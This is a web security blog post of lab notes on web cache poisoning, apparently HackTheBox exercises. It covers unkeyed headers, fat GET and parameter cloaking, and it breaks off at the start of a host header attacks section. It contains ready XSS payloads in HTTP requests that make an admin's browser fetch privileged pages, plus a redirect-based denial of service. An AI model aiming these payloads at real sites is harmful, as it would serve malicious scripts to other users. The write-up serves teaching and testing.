<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Web Cache Poisoning Techniques" /><meta property="og:locale" content="en" /><meta name="description" content="Web cache Poisoning Web cache poisoning is not web cache deception, is not response splitting or request smuggling web cache deception tricking caches into storing sensitive information so the attackers can access to it. web cache poisoning is serve payloads to users via cache responses" /><meta property="og:description" content="Web cache Poisoning Web cache poisoning is not web cache deception, is not response splitting or request smuggling web cache deception tricking caches into storing sensitive information so the attackers can access to it. web cache poisoning is serve payloads to users via cache responses" /><link rel="canonical" href="https://s4yhii.github.io/posts/Web-Cache-Poisoning/" /><meta property="og:url" content="https://s4yhii.github.io/posts/Web-Cache-Poisoning/" /><meta property="og:site_name" content="s4yhii’s Blog" /><meta property="og:image" content="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/webcache.png" /><meta property="og:image:height" content="1500" /><meta property="og:image:width" content="650" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-02-10T11:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/webcache.png" /><meta property="twitter:title" content="Web Cache Poisoning Techniques" /><meta name="twitter:site" content="@s4yhii" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-03-14T08:03:07-05:00","datePublished":"2024-02-10T11:00:00-05:00","description":"Web cache Poisoning Web cache poisoning is not web cache deception, is not response splitting or request smuggling web cache deception tricking caches into storing sensitive information so the attackers can access to it. web cache poisoning is serve payloads to users via cache responses","headline":"Web Cache Poisoning Techniques","image":{"height":1500,"width":650,"url":"https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/webcache.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4yhii.github.io/posts/Web-Cache-Poisoning/"},"url":"https://s4yhii.github.io/posts/Web-Cache-Poisoning/"}</script><title>Web Cache Poisoning Techniques | s4yhii's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="s4yhii's Blog"><meta name="application-name" content="s4yhii's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/streams/dance-pikachu.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">s4yhii's Blog</a></div><div class="site-subtitle font-italic">Appsec blog, CTF write-ups and more</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/s4yhii" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/s4yhii" aria-label="twitter" target="_blank" rel="noopener"> <i class="fa-brands fa-x-twitter"></i> </a> <a href="https://www.linkedin.com/in/jesusluj4n" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://app.hackthebox.com/profile/274780" aria-label="HackTheBox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Web Cache Poisoning Techniques</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Web Cache Poisoning Techniques</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1707580800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Feb 10, 2024 </em> </span> <span> Updated <em class="" data-ts="1710421387" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 14, 2024 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 650 1500'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/webcache.png" class="preview-img bg" alt="Preview Image" width="650" height="1500" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/s4yhii">Jesus Lujan</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2292 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><h1 id="web-cache-poisoning">Web cache Poisoning</h1><p>Web cache poisoning is not web cache deception, is not response splitting or request smuggling web cache deception tricking caches into storing sensitive information so the attackers can access to it. web cache poisoning is serve payloads to users via cache responses <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020231126235320.png" alt="" data-proofer-ignore></p><p>Cache keys: The unique identifier that the server wont cache (refresh based on that: only host + path) <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020231126235920.png" alt="" data-proofer-ignore></p><p>“Everything that is not part of the cache key is part of the cache poisoning attack surface”</p><h2 id="how-to-find-web-cache-poisoning"><span class="mr-2">How To find Web Cache poisoning</span><a href="#how-to-find-web-cache-poisoning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020231222183735.png" alt="" data-proofer-ignore></p><ol><li>Identify unkeyed input: http header or cookie<li>Look up if I can done anything interested (use param miner)<li>Specify a random cache buster(a parameter to change its value every request): if I don’t do this, i will receive the cache response and not the unkeyed inputs injected<li>Try to getting save in the cache</ol><h2 id="case-studies"><span class="mr-2">Case studies:</span><a href="#case-studies" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="trusting-headers"><span class="mr-2">Trusting headers</span><a href="#trusting-headers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020231222184202.png" alt="" data-proofer-ignore> Based on this no cache header, you may think that is safe, but not Use X-Forwarded-Header to inject an unkeyed input <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020231222184301.png" alt="" data-proofer-ignore> The parameter ?safe=1 us used to cache to this specific path and not to the main page</p><h3 id="seizing-the-cache"><span class="mr-2">Seizing the Cache</span><a href="#seizing-the-cache" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020231222184422.png" alt="" data-proofer-ignore> In this Age specifies the exact second that this response will expire to the cache, so in the exact second the cache expires we need to spam the request in order to cache our request.</p><h3 id="selective-poisoning"><span class="mr-2">Selective Poisoning</span><a href="#selective-poisoning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020231222184614.png" alt="" data-proofer-ignore> This Vary: User-Agent Header is telling to the cache to add the user agent to the cache key, so this request will poisoning the cache for other people using the same browser.</p><h2 id="web-cache-configuration"><span class="mr-2">Web cache configuration</span><a href="#web-cache-configuration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>http <span class="o">{</span>
  proxy_cache_path /cache <span class="nv">levels</span><span class="o">=</span>1:2 <span class="nv">keys_zone</span><span class="o">=</span>STATIC:10m <span class="nv">inactive</span><span class="o">=</span>24h <span class="nv">max_size</span><span class="o">=</span>1g<span class="p">;</span>

  server <span class="o">{</span>
    listen       80<span class="p">;</span>

    location / <span class="o">{</span>
      proxy_pass             http://172.17.0.1:80<span class="p">;</span>
      proxy_buffering        on<span class="p">;</span>
      proxy_cache            STATIC<span class="p">;</span>
      proxy_cache_valid      2m<span class="p">;</span>
      proxy_cache_key <span class="nv">$scheme$proxy_host$uri$args</span><span class="p">;</span>
      add_header X-Cache-Status <span class="nv">$upstream_cache_status</span><span class="p">;</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">proxy_cache_path</code> sets general parameters of the cache like the storage location<li><code class="language-plaintext highlighter-rouge">proxy_pass</code> sets the location of the web server<li><code class="language-plaintext highlighter-rouge">proxy_buffering</code> enables caching<li><code class="language-plaintext highlighter-rouge">proxy_cache</code> sets the name of the cache (as defined in <code class="language-plaintext highlighter-rouge">proxy_cache_path</code>)<li><code class="language-plaintext highlighter-rouge">proxy_cache_valid</code> sets the time after which the cache expires<li><code class="language-plaintext highlighter-rouge">proxy_cache_key</code> defines the cache key<li><code class="language-plaintext highlighter-rouge">add_header</code> adds the <code class="language-plaintext highlighter-rouge">X-Cache-Status</code> header to responses to indicate whether the response was cached Example of non-cached and cached requests: <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020231223172148.png" alt="" data-proofer-ignore></ul><h2 id="identify-unkeyed-params"><span class="mr-2">Identify Unkeyed Params</span><a href="#identify-unkeyed-params" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Use this headers to determine if the content served is a cached response or not, check the cache-control response header in the response, how many seconds the response remains refresh: Cache-Control: no-cache Pragma: no-cache (deprecated)</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020231223173520.png" alt="" data-proofer-ignore> When we send a different value in language parameter, we can see that the response differs and we get a ceche miss, therebefore the language parameter has to be keyed.</p><p>Both the language parameter and content are <strong>KEYED</strong> <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020231223183053.png" alt="" data-proofer-ignore></p><p>The ref parameter is unkeyed, now we need to find how this parameter influence in the response content (maybe reflected) <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020231223183205.png" alt="" data-proofer-ignore></p><p>Payload XSS in Unkeyed Parameter</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="dl">"</span><span class="s2">&gt;&lt;script&gt;var xhr=new XMLHttpRequest();xhr.open('GET','/admin.php?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();&lt;/script&gt;
</span></pre></table></code></div></div><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/index.php?language=de&amp;ref=%22%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest();xhr.open(%27GET%27,%20%27/admin.php?reveal_flag=1%27,%20true);xhr.withCredentials%20=%20true;xhr.send();%3C/script%3E</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">webcache.htb</span>
</pre></table></code></div></div><p>Payload XSS in Unkeyed Headers</p><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/index.php?language=de</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">webcache.htb</span>
<span class="na">X-Backend-Server</span><span class="p">:</span> <span class="s">testserver.htb"&gt;&lt;/script&gt;&lt;script&gt;var xhr=new XMLHttpRequest();xhr.open('GET','/admin.php?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();//</span>
</pre></table></code></div></div><h3 id="impact"><span class="mr-2">Impact</span><a href="#impact" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>XSS Unkeyed cookies</p><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/index.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">webcache.htb</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">consent=1;</span>
</pre></table></code></div></div><p>if this response is cached, all other users will that visit the website are server content as if they already consented, also if color=blue cookie is cached, all other uses will still get server the blue layout if they previously choosen another color.</p><p>DOS</p><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">webcache.htb:80</span>
</pre></table></code></div></div><p>If normalization is applied (stripping the port), this request will translate to this</p><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
<span class="na">Location</span><span class="p">:</span> <span class="s">http://webcache.htb:80/index.php</span>
</pre></table></code></div></div><p>So, if we change the host to webcache.htb:1337, all users will be redirected to this port and achieve DOS.</p><h2 id="cache-busters"><span class="mr-2">Cache Busters</span><a href="#cache-busters" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In real cases, we need a unique cache key that we only use, so we get server the poisoned response and no real users are affected</p><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/index.php?language=unusedvalue&amp;ref="&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">webcache.htb</span>
</pre></table></code></div></div><h2 id="advanced-techniques"><span class="mr-2">Advanced Techniques</span><a href="#advanced-techniques" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="fat-get"><span class="mr-2">Fat Get</span><a href="#fat-get" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Basically GET request with request body (any method can contain request body but not necessarily effect), but is the server is misconfigured we can pass the keyed parameters in the request to cache the server.</p><p>This means our first request poisoned the cache with our injected fat GET parameter, but the web cache correctly uses the GET parameter in the URL to determine the cache key.</p><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/index.php?language=de</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">fatget.wcp.htb</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">142</span>

ref="&gt;&lt;script&gt;var xhr = new XMLHttpRequest();xhr.open('GET', '/admin.php?reveal_flag=1', true);xhr.withCredentials = true;xhr.send();&lt;/script&gt;
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020231223212926.png" alt="" data-proofer-ignore></p><h3 id="parameter-cloaking"><span class="mr-2">Parameter Cloaking</span><a href="#parameter-cloaking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Payload with all ; URL encoded:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">ref</span><span class="o">=</span>a%22%3E%3Cscript%3Evar%20xhr%20<span class="o">=</span>%20new%20XMLHttpRequest<span class="o">()</span>%3Bxhr.open<span class="o">(</span>%27GET%27,%20%27/admin.php?reveal_flag<span class="o">=</span>1%27,%20true<span class="o">)</span>%3Bxhr.withCredentials%20<span class="o">=</span>%20true%3Bxhr.send<span class="o">()</span>%3B%3C/script%3E
</pre></table></code></div></div><p>The web cache sees two GET parameters: <code class="language-plaintext highlighter-rouge">language</code> with the value <code class="language-plaintext highlighter-rouge">en</code> and <code class="language-plaintext highlighter-rouge">a</code> with the value <code class="language-plaintext highlighter-rouge">b;language=de</code>. On the other hand, Bottle sees three parameters: <code class="language-plaintext highlighter-rouge">language</code> with the value <code class="language-plaintext highlighter-rouge">en</code>, <code class="language-plaintext highlighter-rouge">a</code> with the value <code class="language-plaintext highlighter-rouge">b</code>, and <code class="language-plaintext highlighter-rouge">language</code> with the value <code class="language-plaintext highlighter-rouge">de</code>. Since Bottle prefers the last occurrence of each parameter, the value <code class="language-plaintext highlighter-rouge">de</code> overrides the value for the language parameter. Thus, Bottle serves the response containing the German text. Since the parameter <code class="language-plaintext highlighter-rouge">a</code> is unkeyed, the web cache stores this response for the cache key <code class="language-plaintext highlighter-rouge">language=en</code>.</p><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/?language=en&amp;a=b;language=de</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">cloak.wcp.htb</span>
</pre></table></code></div></div><p>sent multiple parameters with ; (separator) <strong><em>a, b are unkeyed parameter (we need to use unkeyed to append keyed (language)) language, content and ref are keyed</em></strong></p><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/?language=de&amp;a=b;ref=%22%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest()%3bxhr.open(%27GET%27,%20%27/admin?reveal_flag=1%27,%20true)%3bxhr.withCredentials%20=%20true%3bxhr.send()%3b%3C/script%3E</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">cloak.wcp.htb</span>
</pre></table></code></div></div><h3 id="exercise-web-cache-1-get-fat"><span class="mr-2">Exercise Web Cache 1 (GET FAT)</span><a href="#exercise-web-cache-1-get-fat" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Parameter content and language are keyed <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020231224022217.png" alt="" data-proofer-ignore> This is a get fat exercise, so i need to send language parameter in the GET request body. Since in the hint says the admin will accesses the URL /index.php?language=de, I need to only key this argument like this. <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020231224022431.png" alt="" data-proofer-ignore></p><p>!Flag delivered: HTB{6f4c51837d8148cb8dc66beb14003706} <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020231224022446.png" alt="" data-proofer-ignore></p><h3 id="exercise-web-cache-2parameter-cloaking-"><span class="mr-2">Exercise Web Cache 2(Parameter Cloaking )</span><a href="#exercise-web-cache-2parameter-cloaking-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This is the original request, the hint says the admin will visit /?language=de, so we need to poison this parameter appending a=b;language=payload.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020231224024231.png" alt="" data-proofer-ignore></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Payload:?language<span class="o">=</span>de&amp;a<span class="o">=</span>b<span class="p">;</span><span class="nv">language</span><span class="o">=</span>%22%3E%3Cscript%3Evar%20xhr%20<span class="o">=</span>%20new%20XMLHttpRequest<span class="o">()</span>%3bxhr.open<span class="o">(</span>%27GET%27,%20%27/admin?reveal_flag<span class="o">=</span>1%27,%20true<span class="o">)</span>%3bxhr.withCredentials%20<span class="o">=</span>%20true%3bxhr.send<span class="o">()</span>%3b%3C/script%3E
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020231224024455.png" alt="" data-proofer-ignore> We see the payload reflected in the response (stored xss), so the server cached the response and a request to /?language=de will serve the payload to admin.</p><p>Flag delivered!: HTB{cac766b823bbd388727162d634fa7503} <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020231224024145.png" alt="" data-proofer-ignore></p><h1 id="host-header-attacks">Host Header Attacks</h1><p>Common web server configuration:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>&lt;VirtualHost <span class="k">*</span>:80&gt;
    DocumentRoot <span class="s2">"/var/www/testapp"</span>
    ServerName testapp.htb
&lt;/VirtualHost&gt;

&lt;VirtualHost <span class="k">*</span>:80&gt;
    DocumentRoot <span class="s2">"/var/www/anotherdomain"</span>
    ServerName anotherdomain.org
